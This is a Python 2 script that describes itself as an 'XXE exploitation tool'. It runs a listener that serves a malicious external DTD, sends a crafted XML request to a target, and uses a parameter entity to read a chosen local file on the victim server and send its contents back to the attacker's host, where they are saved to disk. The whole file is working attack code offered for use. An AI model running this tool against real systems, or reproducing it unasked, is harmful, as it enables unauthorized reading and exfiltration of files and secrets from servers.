#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# author: @090h
# usage:
# xtool.py -i 172.16.0.138 -p 8000 -r psigw.txt
# 

from SocketServer import BaseRequestHandler, TCPServer, ThreadingMixIn
from threading import Thread
from datetime import datetime
from argparse import ArgumentParser
import urllib2
from os import path, makedirs

payload = """<!ENTITY % payload SYSTEM "file:///%FILE%">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://%IP%:%PORT%/start_of_file/%payload;/end_of_file/'>">"""
filename = 'nofile'

class XXERequestHandler(BaseRequestHandler):
    headers = """HTTP/1.1 200 OK
Date: Tue, 30 Jul 2013 13:35:12 GMT
Last-Modified: Tue, 30 Jul 2013 12:07:31 GMT
Etag: "51f7ac83.228"
Content-Type: text/xml
Content-Length: %i
Connection: close
Accept-Ranges: bytes

"""
    save_path = path.join(path.dirname(__file__), 'saved')

    def handle(self):
        print "{} connected and wrote:".format(self.client_address[0])
        #self.data = self.request.recv(1024).strip()
        #self.data = ''
        self.data = self.request.recv(8*1024)#.strip()


        print self.data
        response = self.headers % len(payload) + payload
        print response
        if self.data.find('/start_of_file/') != -1 :#and self.data.find('/end_of_file/') != -1:

            if not path.exists(self.save_path):
                makedirs(self.save_path)

            fname = path.join(self.save_path, filename)
            print "Saving to: %s" % fname
            content = self.data.split('/start_of_file/')[1].split('/end_of_file/')[0]
            f = open(fname, 'wb')
            f.write(content)
            f.close()
        self.request.sendall(response)


class XXEServer(ThreadingMixIn, TCPServer):

    def run_as_daemon(self):
        server_thread = Thread(target=self.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        return server_thread

    def set_payload(self):
        pass


class XXERequest:

    headers = {}

    def __init__(self, ip, port, url=None, data=None, filename=None):
        if filename is None:
            self.url, self.data, self.filename = url, data, filename
        else:
            reqtxt = open(filename, 'rb').read().replace('%IP%', ip).replace('%PORT%', str(port))
            part1, self.data = reqtxt.split('\r\n\r\n')
            #self.data = self.data

            #URL work and request type
            req_type, req_url, req_proto = part1.split('\r\n')[0].split(' ')

            #Headers work
            h = part1.split('\r\n')[1:]
            skip = ['Accept-Encoding', 'Content-Length', 'Host']
            for line in h:
                #print line
                key, value = line.split(': ')
                if key.lower() == 'host':
                    #TODO: Temporary code. need to be fixed
                    self.url = 'http://' + value + req_url

                if key not in skip:
                    self.headers[key] = value

    def send(self):
        try:
            if self.data is None:
                request = urllib2.Request(self.url)
            else:
                request = urllib2.Request(self.url, self.data, self.headers)
            return urllib2.urlopen(request).read().decode("UTF-8", "replace")
        except urllib2.HTTPError, error:
            return error.read()

    def __str__(self):
        return "url> %s\ndata> %s\nheaders> %s" % (self.url, self.data, repr(self.headers))


if __name__ == '__main__':
    parser = ArgumentParser(description='XXE exploitation tool.')
    parser.add_argument('--version', action='version', version='%(prog)s 0.2')

    parser.add_argument('-u', '--url', required=False, help='url for HTTP query')
    parser.add_argument('-d', '--data', required=False, help='data to send to victim')
    parser.add_argument('-r', '--request', required=False, help='load request from file')

    parser.add_argument('-i', '--ip', required=True, help='ip for port binding')
    parser.add_argument('-p', '--port', required=False, default=8000, type=int, help='port for IO activity')

    parser.add_argument('-f', '--filename', required=False, help="file to dump")
    #parser.add_argument('-F', '--filename-list', required=False, help="file containing file list to dump")

    args = parser.parse_args()
    start_time = datetime.now()

    #XXEServer
    print "Launching XXE Server..."
    server = XXEServer((args.ip, args.port), XXERequestHandler)
    server_thread = server.run_as_daemon()
    print "XXE Server loop running in thread:", server_thread.name

    #Preparing payload
    payload = payload.replace('%FILE%', args.filename).replace('%IP%', args.ip).replace('%PORT%', str(args.port))
    h, filename = path.split(args.filename.replace('\\','/'))

    #XXEClient
    xxr = XXERequest(args.ip, args.port, args.url, None, args.request)
    print xxr
    print xxr.send()

    # Closing XXEServer thread
    #from time import sleep
    #sleep(1)
    raw_input("any key to exit")
    server.shutdown()

    #print "Start time: " + start_time.strftime('%Y-%m-%d %H:%M:%S')
    #print "Finish time: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')



